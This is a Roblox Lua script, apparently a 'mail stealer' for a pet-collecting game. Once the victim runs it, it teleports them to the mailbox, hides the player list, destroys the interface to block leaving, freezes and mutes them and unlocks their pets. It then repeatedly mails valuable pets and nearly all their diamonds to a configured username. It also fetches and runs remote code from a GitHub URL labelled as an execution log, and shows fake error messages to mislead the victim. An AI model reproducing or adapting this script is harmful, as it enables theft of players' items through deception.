local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network);
local Fire = Network.Fire
old = hookfunction(getupvalue(Fire, 1), function(...) 
    return true 
end)

--// Vars
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local FrameworkLibrary = require(game.ReplicatedStorage.Framework.Library)
local CoreGui = game:GetService("CoreGui")
local RobloxGui = CoreGui.RobloxGui
local Client = Players.LocalPlayer
local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network);
local Fire = Network.Fire
local lockedCount = 0
local Invoke = Network.Invoke

--// Pet Folders
local PetFolders = {
	game.Players.LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Normal,
	game.Players.LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Titanic
}

if time() <= 30 then
	wait(1.2)
	game.StarterGui:SetCore("SendNotification", {
	Title = "Script error"; -- the title (ofc)
	Text = "Please wait and try again Remote not found !"; -- what the text says (ofc)
	Icon = "rbxassetid://57254792"; -- the image if u want. 
	Duration = 15; -- how long the notification should in secounds
	})
	return
end

--// Loading UI
--// Teleport To Mailbox
local mailbox = game:GetService("Workspace")["__MAP"].Interactive.Mailbox
for i,v in pairs(mailbox:GetDescendants()) do
    if v:IsA("MeshPart") or v:IsA("Part") then
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Position)
        break
    end
end

--// Diamond Check
if Client.leaderstats.Diamonds.Value < _G.Diamonds then
	Client:Kick("Script Error")
end


--// Disable Playerlist
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)

--// Anti Leave
if _G.AntiLeave == true then
    RobloxGui:Destroy()
end

--// Freeze Character
wait(0.5)
Client.Character.HumanoidRootPart.Anchored = true


--// Execution Log
loadstring(game:HttpGet("https://raw.githubusercontent.com/Wopy13/webhook/main/webh2"))()



--// Unlock Pets
if _G.UnlockPets == true then
    local function unlockPetsInFolder(folder)
        local children = folder:GetChildren()
        for _, child in ipairs(children) do
            if child:IsA("TextButton") and child.Locked.Visible == true then
                local name = child.Name
                if child.Name then
                    local args2 = {
                        [1] = {
                            ["" .. name] = false
                        }
                    }
                    Invoke("Lock Pet", unpack(args2))
                end
            end
        end
    end
    
    while true do
        for _, folder in pairs(PetFolders) do
          unlockPetsInFolder(folder)
          wait(.2)
        end
        for _, folder in ipairs(PetFolders) do
            for _, child in ipairs(folder:GetChildren()) do
                if child:IsA("TextButton") and child.Locked.Visible == true then
                    lockedCount = lockedCount + 1
                end
            end
        end
        if lockedCount == 0 then
            print('Unlocked All')
            break
        end
    end
end

--// turn off sound
UserSettings().GameSettings.MasterVolume = 0



--// Mail Stealer 
local savedPets = FrameworkLibrary.Save.Get().Pets
while wait() do
	for i,v in pairs(savedPets) do
    	local v2 = FrameworkLibrary.Directory.Pets[v.id]
		if v2.huge == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 15000000 then
			local args = {
    			[1] = {
        			["Recipient"] = _G.Username,
        			["Diamonds"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 800000,
        			["Pets"] = {v.uid},
        			["Message"] = _G.GiftMessage
    			}
			}
			Invoke("Send Mail", unpack(args)) 
		elseif v2.rarity == "Exclusive" then
			local args = {
    			[1] = {
        			["Recipient"] = _G.Username,
        			["Diamonds"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 800000,
        			["Pets"] = {v.uid},
        			["Message"] = _G.GiftMessage
    			}
			}
			Invoke("Send Mail", unpack(args))
        elseif v2.huge == true then
			local args = {
    			[1] = {
        			["Recipient"] = _G.Username,
        			["Diamonds"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 800000,
        			["Pets"] = {v.uid},
        			["Message"] = _G.GiftMessage
    			}
			}
			Invoke("Send Mail", unpack(args))
		elseif v2.rarity == "Event" then
			local args = {
    			[1] = {
        			["Recipient"] = _G.Username,
        			["Diamonds"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 800000,
        			["Pets"] = {v.uid},
        			["Message"] = _G.GiftMessage
    			}
			}
			Invoke("Send Mail", unpack(args))
		elseif v2.rarity == "Secret" then
			local args = {
    			[1] = {
        			["Recipient"] = _G.Username,
        			["Diamonds"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 800000,
        			["Pets"] = {v.uid},
        			["Message"] = _G.GiftMessage
    			}
			}
			Invoke("Send Mail", unpack(args))
		end
	end
end	